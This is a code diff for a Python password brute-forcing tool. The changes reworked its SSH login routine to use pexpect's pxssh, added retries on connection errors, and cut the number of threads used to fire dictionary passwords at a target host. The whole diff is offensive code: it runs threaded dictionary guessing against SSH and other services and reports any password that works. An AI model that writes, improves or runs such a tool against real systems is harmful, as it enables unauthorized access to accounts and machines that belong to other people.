@@ -37,6 +37,7 @@ from ftplib import FTP
 from scapy.all import *
 from random import randint
 from threading import Thread
+from pexpect.pxssh import pxssh
 from argparse import ArgumentParser
 from paramiko import SSHClient, AutoAddPolicy
 from string import digits, ascii_lowercase, uppercase, hexdigits, letters, punctuation
@@ -370,24 +371,31 @@ def detonate(log, addr, psswd, essai):
 	except Exception as e:
 		trig.close()
 
-def ssh_conn(log, addr, passwd, essai, p_port):
+def ssh_conn(log, addr, passwd, essai, p_port, fails_nb):
 	global flag
+	Fails = fails_nb
 	try:
-		client = SSHClient()
-		client.set_missing_host_key_policy(AutoAddPolicy())
+		client = pxssh()
+#		client = SSHClient()
+#		client.set_missing_host_key_policy(AutoAddPolicy())
 		sys.stdout.write('\r\033[96m[SSH]\033[0m Essai nb*' + str(essai) + ' sur ' + addr + ' : ' + passwd)
 		sys.stdout.flush()
-		client.connect(addr,
-			username=log,
-			password=psswd,
-			timeout=2,
-			port=p_port,
-			look_for_keys=False)
+		client.login(addr, log, passwd)
+#		client.connect(addr, username=log, password=psswd, port=p_port,
+#			timeout=2, look_for_keys=False)
 		print '\n\n\033[91m[SSH]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n'
 		client.close()
 		flag = 1
-	except:
-		pass
+	except Exception as e:
+		Fails += 1
+		if Fails > 5:
+			pass
+		elif 'read_nonblocking' in str(e):
+			time.sleep(5)
+			ssh_conn(log, addr, passwd, essai, p_port, Fails)
+		elif 'synchronize with original prompt' in str(e):
+			time.sleep(1)
+			ssh_conn(log, addr, passwd, essai, p_port, Fails)
 
 # HTTP / HTTPS part ==============================================================================
 def query(port, dst):
@@ -970,11 +978,11 @@ if __name__ == '__main__':
 					try:
 						threads = []
 						for item in dic:
-							t = Thread(target=detonate,args=(user,ip,item,idx,))
-							threads.append(t)
-							t.start()
+							conn = Thread(target=detonate,args=(user,ip,item,idx,))
+							threads.append(conn)
+							conn.start()
 							idx += 1
-							if len(threads) >= 86:
+							if len(threads) >= 42:
 								for thr in threads:
 									thr.join()
 								threads = []
@@ -997,11 +1005,11 @@ if __name__ == '__main__':
 					try:
 						threads = []
 						for psswd in dic:
-							conn = Thread(target=ssh_conn,args=(user,host,psswd,idx,port_idx[0],))
-							threads.append(t)
+							conn = Thread(target=ssh_conn,args=(user,host,psswd,idx,port_idx[0],0,))
+							threads.append(conn)
 							conn.start()
 							idx += 1
-							if len(threads) >= 86:
+							if len(threads) >= 42:
 								for thr in threads:
 									thr.join()
 								threads = []
